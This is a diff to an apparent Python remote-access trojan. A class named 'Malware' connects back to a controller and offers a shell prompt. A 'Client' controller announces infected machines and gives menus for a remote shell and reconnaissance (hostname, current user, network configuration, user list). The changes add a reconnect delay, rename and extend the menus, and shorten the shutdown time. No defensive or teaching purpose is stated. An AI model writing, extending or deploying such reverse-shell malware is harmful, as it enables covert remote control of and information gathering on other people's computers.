@@ -29,6 +29,7 @@ class Malware(Machine):
             time.sleep(1)
             self.send(os.getcwd() + "> ")
         except socket.error:
+            time.sleep(10)
             self.start()
 
     def send(self, message):
@@ -46,6 +47,8 @@ class Malware(Machine):
 
     def get_socket(self):
         return self.my_socket
+
+
 """
 Classe contenant les fonction pour le malware
 """
@@ -65,19 +68,27 @@ class Client(Machine):
         print("Connection accepted for :", addr)
         hostname = distant_socket.recv(self.buffsize).decode(self.language)
         print("The malware has infected the machine named " + str(hostname) + "\n")
-        choix = self.menu()
+        choix = self.menu_principal()
         return choix
 
-    def menu(self):
+    def menu_principal(self):
         print("╔═════════════════════════════════════════════════════════╗")
         print("  |\  /|   /\   | |\  |   |\  /| |¯¯¯ |\  | |   |")
         print("  | \/ |  /__\  | | \ |   | \/ | |--  | \ | |   |")
         print("  |    | /    \ | |  \|   |    | |___ |  \| |___|")
-        print("═════════════════════════════════════════════════════════╗")
-        print("Press 1 to access the remote shell")
+        print("╚═════════════════════════════════════════════════════════╝")
+        print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
         print("Press 2 to get informations")
         choix = input()
         return choix
+
+    def choice_information(self):
+        print("Press 1 to get the infected computer name")
+        print("Press 2 to see who is the current user")
+        print("Press 3 to get the network configuration")
+        print("Press 4 to get the list of users")
+        print("Press 5 to return to main menu")
+        return input()
 
     def send(self, commande):
         distant_socket.send(commande.encode(self.language))
@@ -88,8 +99,8 @@ class Client(Machine):
         print(rep, end="")
 
     def quit(self):
-        print("Shutting down in 10 seconds")
-        time.sleep(10)
+        print("Shutting down in 3 seconds")
+        time.sleep(3)
         distant_socket.close()
         self.my_socket.close()
         sys.exit()
